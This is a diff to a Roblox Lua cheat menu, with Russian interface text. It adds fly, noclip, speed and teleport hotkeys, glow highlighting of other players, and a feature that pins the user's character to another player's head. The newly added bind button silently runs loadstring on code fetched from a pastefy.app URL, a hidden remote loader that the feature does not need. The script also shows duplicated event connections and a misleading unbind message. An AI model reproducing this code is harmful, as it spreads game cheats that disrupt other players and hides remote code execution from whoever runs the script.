@@ -5,6 +5,8 @@ local mouse = player:GetMouse()
 local character = player.Character or player.CharacterAdded:Wait()
 local UserInputService = game:GetService("UserInputService")
 local statustelep = false  
+local nameorange = {}
+local glowButtonState = {}
 local isFPressed = false 
 local initialPosition = character.HumanoidRootPart.Position 
 local teleportConnection = nil  
@@ -13,6 +15,7 @@ local humanoid = character:WaitForChild("Humanoid")
 local isSpeedOn = false
 local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
 local speed = 1
+local isOpen = false
 local noclipSpeed = 10
 local character123 = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
 local function enableNoClip1() 
@@ -236,7 +239,7 @@ local function showTeleportMessage(targetPlayer)
     messageLabel.Size = UDim2.new(1, 0, 1, 0)
     messageLabel.Text = "Телепортирован к: " .. targetPlayer.Name .. " (" .. targetPlayer.DisplayName .. ")"
     messageLabel.BackgroundTransparency = 1
-    messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  
+    messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     messageLabel.Font = Enum.Font.GothamBold
     messageLabel.TextSize = 18
     messageLabel.TextXAlignment = Enum.TextXAlignment.Center
@@ -287,28 +290,6 @@ local function calculateDistance(player1, player2)
     end
     return 0
 end
-local function formatPlayerName(name)
-    local upperCount = 0
-    local lowerCount = 0
-    for i = 1, #name do
-        local char = name:sub(i, i)
-        if char:match("%u") then  
-            upperCount = upperCount + 1
-        elseif char:match("%l") then
-            lowerCount = lowerCount + 1
-        end
-    end
-    if upperCount > lowerCount then
-        if #name > 23 then
-            return name:sub(1, 23) .. "..."
-        end
-    else
-        if #name > 35 then
-            return name:sub(1, 35) .. "..." 
-        end
-    end
-    return name
-end
 local function addPlayerButtons()
     local yOffset = 0
     local playerCount = 0  
@@ -320,25 +301,57 @@ local function addPlayerButtons()
             playerButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
             playerButton.BorderSizePixel = 0
             playerButton.Parent = playerListFrame
-
+			local nitarte2CloseButton = Instance.new("TextButton")
+			nitarte2CloseButton.Size = UDim2.new(0, 30, 0, 30)
+			nitarte2CloseButton.Position = UDim2.new(1, 4, 0, -35) 
+			nitarte2CloseButton.Text = "X"
+			nitarte2CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+			nitarte2CloseButton.Font = Enum.Font.GothamBold
+			nitarte2CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  
+			nitarte2CloseButton.BorderSizePixel = 0
+			nitarte2CloseButton.TextSize = 18
+			nitarte2CloseButton.Parent = frame
+			nitarte2CloseButton.MouseButton1Click:Connect(function()
+				screenGui.Enabled = false  
+				isOpen = not isOpen
+			end)
             local nameButton = Instance.new("TextButton")
             nameButton.Size = UDim2.new(0, 250, 1, 0)
             nameButton.Position = UDim2.new(0, 40, 0, 0)
-            local playerNameText
-            if otherPlayer.Name == otherPlayer.DisplayName then
-                playerNameText = otherPlayer.Name
-            else
-                playerNameText = otherPlayer.Name .. " (" .. otherPlayer.DisplayName .. ")"
+            local playerNameText = otherPlayer.Name
+			local textColor
+            local upperCount = 0
+            local lowerCount = 0
+            for i = 1, #playerNameText do
+                local char = playerNameText:sub(i, i)
+                if char:match("%u") then
+                    upperCount = upperCount + 1
+                elseif char:match("%l") then 
+                    lowerCount = lowerCount + 1
+                end
             end
-            playerNameText = formatPlayerName(playerNameText)
-            nameButton.Text = playerNameText
-            nameButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            if player:IsFriendsWith(otherPlayer.UserId) then
-                nameButton.TextColor3 = Color3.fromRGB(0, 255, 0) 
+            if upperCount > lowerCount then
+                if #playerNameText > 23 then
+                    playerNameText = playerNameText:sub(1, 23) .. "..."
+                end
             else
-                nameButton.TextColor3 = Color3.fromRGB(255, 255, 255)  
+                if #playerNameText > 35 then
+                    playerNameText = playerNameText:sub(1, 35) .. "..."
+                end
             end
-
+			if otherPlayer.Name ~= otherPlayer.DisplayName then
+				playerNameText = playerNameText .. " (" .. otherPlayer.DisplayName .. ")"
+			end
+			if nameorange[otherPlayer.UserId] == true then
+				textColor = Color3.fromRGB(255, 165, 0)
+			elseif player:IsFriendsWith(otherPlayer.UserId) then
+				textColor = Color3.fromRGB(0, 255, 0)
+			else
+				textColor = Color3.fromRGB(255, 255, 255)
+			end
+			nameButton.Text = playerNameText
+			nameButton.TextColor3 = textColor
+			nameButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
             nameButton.Font = Enum.Font.Gotham
             nameButton.TextSize = 16
             nameButton.TextXAlignment = Enum.TextXAlignment.Left
@@ -351,12 +364,7 @@ local function addPlayerButtons()
             distanceLabel.Position = UDim2.new(0, 320, 0, 0) 
             distanceLabel.Text = "0м"  
             distanceLabel.BackgroundTransparency = 1
-            distanceLabel.TextColor3 = Color3.fromRGB(255, 255, 255) 
-			if player:IsFriendsWith(otherPlayer.UserId) then
-                distanceLabel.TextColor3 = Color3.fromRGB(0, 255, 0) 
-            else
-                distanceLabel.TextColor3 = Color3.fromRGB(255, 255, 255) 
-            end
+            distanceLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
             distanceLabel.Font = Enum.Font.Gotham
             distanceLabel.TextSize = 16
             distanceLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -381,10 +389,15 @@ local function addPlayerButtons()
             glowButton.Font = Enum.Font.GothamBold
             glowButton.TextSize = 14
             glowButton.Parent = playerButton
+			if glowButtonState[otherPlayer.UserId] then
+				glowButton.Visible = false
+            end
             local selectionBox = nil  
-            local isGlowing = false 
+            local isGlowing = false
             glowButton.MouseButton1Click:Connect(function()
-			glowButton.Visible = false
+                glowButton.Text = "Glowed!"
+				nameorange[otherPlayer.UserId] = true
+				glowButtonState[otherPlayer.UserId] = true
                 if otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
                     if not isGlowing then
                         selectionBox = Instance.new("SelectionBox")
@@ -395,16 +408,19 @@ local function addPlayerButtons()
                         selectionBox.Transparency = 0.5
                         glowButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  
                         isGlowing = true
+						addPlayerButtons()
                     else
                         selectionBox:Destroy()
                         glowButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  
                         isGlowing = false
+						addPlayerButtons()
                     end
                 else
                     warn("Ошибка: Персонаж не найден")
-					info = "Ошибка: Персонаж не найден"
-					infoMessage(info)
+                    info = "Ошибка: Персонаж не найден"
+                    infoMessage(info)
                 end
+				addPlayerButtons()
             end)
             local billboardGui = Instance.new("BillboardGui")
             billboardGui.Size = UDim2.new(0, 100, 0, 50)
@@ -475,13 +491,208 @@ local function addPlayerButtons()
     playerListFrame.CanvasSize = UDim2.new(0, 0, 0, playerCount * 45) 
 end
 local clearGlowButton = Instance.new("TextButton")
-clearGlowButton.Size = UDim2.new(0, 500, 0, 60)
-clearGlowButton.Position = UDim2.new(0, 0, 1, -60)
+clearGlowButton.Size = UDim2.new(0, 500, 0, 30)
+clearGlowButton.Position = UDim2.new(0, 0, 1, -30)
 clearGlowButton.Text = "By nitarte:3"
 clearGlowButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 clearGlowButton.Font = Enum.Font.GothamBold
 clearGlowButton.TextSize = 16
 clearGlowButton.Parent = frame
+local nitarteBindButton1 = Instance.new("TextButton")
+nitarteBindButton1.Size = UDim2.new(0, 500, 0, 30)
+nitarteBindButton1.Position = UDim2.new(0, 0, 1, -60)
+nitarteBindButton1.Text = "Привязка к человеку"
+nitarteBindButton1.TextColor3 = Color3.fromRGB(255, 255, 255)
+nitarteBindButton1.Font = Enum.Font.GothamBold
+nitarteBindButton1.TextSize = 16
+nitarteBindButton1.Parent = frame
+local nitarteForm = Instance.new("Frame")
+nitarteForm.Size = UDim2.new(0, 600, 0, 400)
+nitarteForm.Position = UDim2.new(1, 50, 0.5, -200)
+nitarteForm.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+nitarteForm.Visible = false
+nitarteForm.Parent = frame
+local nitarteCloseButton = Instance.new("TextButton")
+nitarteCloseButton.Size = UDim2.new(0, 30, 0, 30)
+nitarteCloseButton.Position = UDim2.new(1, -30, 0, 0)
+nitarteCloseButton.Text = "X"
+nitarteCloseButton.TextColor3 = Color3.fromRGB(255, 0, 0)
+nitarteCloseButton.Font = Enum.Font.GothamBold
+nitarteCloseButton.TextSize = 16
+nitarteCloseButton.Parent = nitarteForm
+nitarteCloseButton.MouseButton1Click:Connect(function()
+    nitarteForm.Visible = false
+end)
+local nitartePlayerNameInput = Instance.new("TextBox")
+nitartePlayerNameInput.Size = UDim2.new(0, 250, 0, 30)
+nitartePlayerNameInput.Position = UDim2.new(0.5, -125, 0, 10)
+nitartePlayerNameInput.PlaceholderText = "Введите имя игрока"
+nitartePlayerNameInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+nitartePlayerNameInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+nitartePlayerNameInput.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
+nitartePlayerNameInput.Font = Enum.Font.Gotham
+nitartePlayerNameInput.TextSize = 16
+nitartePlayerNameInput.BorderSizePixel = 2
+nitartePlayerNameInput.BorderColor3 = Color3.fromRGB(100, 100, 100)
+nitartePlayerNameInput.BackgroundTransparency = 0.1
+nitartePlayerNameInput.Parent = nitarteForm
+local nitartePlayersList = Instance.new("ScrollingFrame")
+nitartePlayersList.Size = UDim2.new(1, 0, 0, 300)
+nitartePlayersList.Position = UDim2.new(0, 0, 0, 50)
+nitartePlayersList.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+nitartePlayersList.ScrollBarThickness = 10
+nitartePlayersList.Parent = nitarteForm
+local function nitarteUpdatePlayersList(searchText)
+    for _, child in ipairs(nitartePlayersList:GetChildren()) do
+        if child:IsA("Frame") then
+            child:Destroy()
+        end
+    end
+    local yOffset = 0
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Name:lower():find(searchText:lower()) then
+            local nitartePlayerRow = Instance.new("Frame")
+            nitartePlayerRow.Size = UDim2.new(1, 0, 0, 60)
+            nitartePlayerRow.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+            nitartePlayerRow.Position = UDim2.new(0, 0, 0, yOffset)
+            nitartePlayerRow.Parent = nitartePlayersList
+            local nitarteAvatarImage = Instance.new("ImageLabel")
+            nitarteAvatarImage.Size = UDim2.new(0, 50, 0, 50)
+            nitarteAvatarImage.Position = UDim2.new(0, 0, 0, 5)
+            nitarteAvatarImage.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+            nitarteAvatarImage.BackgroundTransparency = 1
+            nitarteAvatarImage.Parent = nitartePlayerRow
+            local nitartePlayerNameLabel = Instance.new("TextLabel")
+            nitartePlayerNameLabel.Size = UDim2.new(0, 100, 0, 30)
+            nitartePlayerNameLabel.Position = UDim2.new(0, 90, 0, 5)
+            nitartePlayerNameLabel.Text = player.Name
+			if game.Players.LocalPlayer:IsFriendsWith(player.UserId) then
+				nitartePlayerNameLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+			else
+				nitartePlayerNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+			end
+            nitartePlayerNameLabel.Font = Enum.Font.GothamBold
+            nitartePlayerNameLabel.TextSize = 16
+            nitartePlayerNameLabel.BackgroundTransparency = 1
+            nitartePlayerNameLabel.Parent = nitartePlayerRow
+            local nitartePlayerDisplayNameLabel = Instance.new("TextLabel")
+			nitartePlayerDisplayNameLabel.Size = UDim2.new(0, 100, 0, 30)
+			nitartePlayerDisplayNameLabel.Position = UDim2.new(0, 270, 0, 5)
+			nitartePlayerDisplayNameLabel.Text = player.DisplayName
+			if game.Players.LocalPlayer:IsFriendsWith(player.UserId) then
+				nitartePlayerDisplayNameLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+			else
+				nitartePlayerDisplayNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+			end
+			nitartePlayerDisplayNameLabel.Font = Enum.Font.Gotham
+			nitartePlayerDisplayNameLabel.TextSize = 14
+			nitartePlayerDisplayNameLabel.BackgroundTransparency = 1
+			nitartePlayerDisplayNameLabel.Parent = nitartePlayerRow
+            local nitarteBindButton = Instance.new("TextButton")
+            nitarteBindButton.Size = UDim2.new(0, 75, 0, 30)
+            nitarteBindButton.Position = UDim2.new(0, 410, 0, 5)
+            nitarteBindButton.Text = "Привязать"
+            nitarteBindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            nitarteBindButton.Font = Enum.Font.GothamBold
+            nitarteBindButton.TextSize = 14
+            nitarteBindButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+            nitarteBindButton.Parent = nitartePlayerRow
+            local nitarteUnbindButton = Instance.new("TextButton")
+            nitarteUnbindButton.Size = UDim2.new(0, 75, 0, 30)
+            nitarteUnbindButton.Position = UDim2.new(0, 490, 0, 5)
+            nitarteUnbindButton.Text = "Отвязать"
+            nitarteUnbindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            nitarteUnbindButton.Font = Enum.Font.GothamBold
+            nitarteUnbindButton.TextSize = 14
+            nitarteUnbindButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+            nitarteUnbindButton.Parent = nitartePlayerRow
+local function attachToHead(targetPlayer)
+    local localPlayer = game.Players.LocalPlayer
+    local localCharacter = localPlayer.Character
+    local targetCharacter = targetPlayer.Character
+    if localCharacter and targetCharacter and targetCharacter:FindFirstChild("Head") then
+        localPlayer.Character:SetPrimaryPartCFrame(targetCharacter.Head.CFrame * CFrame.new(0, 1, 0))
+        local humanoid = localCharacter:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.Sit = true
+        end
+        local bodyPosition = Instance.new("BodyPosition")
+        bodyPosition.MaxForce = Vector3.new(4000, 4000, 4000)
+        bodyPosition.D = 1000 
+        bodyPosition.P = 10000 
+        bodyPosition.Position = targetCharacter.Head.Position + Vector3.new(0, 1, 0)
+        bodyPosition.Parent = localCharacter.HumanoidRootPart
+        local function updatePosition()
+            if targetCharacter and targetCharacter:FindFirstChild("Head") then
+                bodyPosition.Position = targetCharacter.Head.Position + Vector3.new(0, 1, 0)
+                local targetLookDirection = targetCharacter.HumanoidRootPart.CFrame.lookVector
+                localPlayer.Character:SetPrimaryPartCFrame(CFrame.new(localCharacter.HumanoidRootPart.Position, localCharacter.HumanoidRootPart.Position + targetLookDirection) * CFrame.Angles(0, math.pi, 0))
+            else
+                bodyPosition:Destroy()
+            end
+        end
+        game:GetService("RunService").Heartbeat:Connect(updatePosition)
+        print("Вы привязались и развернулись на 180° к игроку: " .. targetPlayer.Name)
+    else
+        warn("Ошибка: У целевого игрока нет головы или персонажа!")
+    end
+end
+nitarteBindButton.MouseButton1Click:Connect(function()
+    local targetPlayer = player  
+	loadstring(game:HttpGet("https://pastefy.app/lawnvcTT/raw", true))()
+    if targetPlayer then
+        attachToHead(targetPlayer)
+    end
+end)
+nitarteUnbindButton.MouseButton1Click:Connect(function()
+    local localPlayer = game.Players.LocalPlayer
+    local localCharacter = localPlayer.Character
+    local targetPlayer = player 
+    if localCharacter and localCharacter:FindFirstChild("HumanoidRootPart") then
+        local humanoid = localCharacter:FindFirstChildOfClass("Humanoid")
+        for _, child in ipairs(localCharacter.HumanoidRootPart:GetChildren()) do
+            if child:IsA("BodyPosition") or child:IsA("BodyGyro") then
+                child:Destroy()
+            end
+        end
+        if humanoid then
+            humanoid.Sit = false
+        end
+        if humanoid then
+            humanoid.PlatformStand = false
+        end
+        local spawnPoint = game:GetService("Workspace"):WaitForChild("SpawnLocation")
+        if spawnPoint then
+            localCharacter:SetPrimaryPartCFrame(spawnPoint.CFrame)
+        end
+        print("Вы полностью отвязались, сбросили все привязки, и теперь убиты. Вы перешли в точку спауна.")
+    else
+        warn("Ошибка: У игрока нет персонажа или целевой игрок не найден!")
+    end
+end)
+            yOffset = yOffset + 60
+        end
+    end
+    nitartePlayersList.CanvasSize = UDim2.new(0, 0, 0, yOffset)
+end
+nitartePlayerNameInput:GetPropertyChangedSignal("Text"):Connect(function()
+    local searchText = nitartePlayerNameInput.Text
+    nitarteUpdatePlayersList(searchText)
+end)
+nitarteBindButton1.MouseButton1Click:Connect(function()
+    nitarteForm.Visible = true
+    nitarteUpdatePlayersList("")
+end)
+nitartePlayerNameInput:GetPropertyChangedSignal("Text"):Connect(function()
+    local searchText = nitartePlayerNameInput.Text
+    nitarteUpdatePlayersList(searchText)
+end)
+
+nitarteBindButton1.MouseButton1Click:Connect(function()
+    nitarteForm.Visible = true
+    nitarteUpdatePlayersList("")
+end)
+
 local tpbut = Instance.new("TextButton")
 tpbut.Size = UDim2.new(0, 150, 0, 30)
 tpbut.Position = UDim2.new(0, 160, 0, -20)
@@ -669,7 +880,6 @@ clearGlowButton.MouseButton1Click:Connect(function()
     end
     activeSelectionBoxes = {}
 end)
-local isOpen = false
 local function toggleGui()
     if isOpen then
         screenGui.Enabled = false  
@@ -680,17 +890,35 @@ local function toggleGui()
     end
     isOpen = not isOpen
 end
+local isNitarteFormOpen = false
+local function toggleNitarteForm()
+    if isNitarteFormOpen then
+        nitarteForm.Visible = false
+    else
+        nitarteForm.Visible = true
+        nitarteUpdatePlayersList("")
+    end
+    isNitarteFormOpen = not isNitarteFormOpen
+end
 game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
     if not gameProcessed then
-        if input.KeyCode == Enum.KeyCode.Insert then
+        if input.KeyCode == Enum.KeyCode.Z then
+            toggleFlyAndNoClip()
+        elseif input.KeyCode == Enum.KeyCode.X then
+            toggleSpeed()
+        elseif input.KeyCode == Enum.KeyCode.V then
+            toggleNitarteForm()
+        elseif input.KeyCode == Enum.KeyCode.C then
+            toggletp()
+        elseif input.KeyCode == Enum.KeyCode.Insert then
             toggleGui()
         elseif input.KeyCode == Enum.KeyCode.T then
             if lastTeleportedPlayer then
                 teleportToPlayer(lastTeleportedPlayer)
             else
                 warn("Нет последнего телепортированного игрока.")
-				info = "Нет последнего телепортированного игрока!"
-				infoMessage(info)
+                info = "Нет последнего телепортированного игрока!"
+                infoMessage(info)
             end
         end
     end
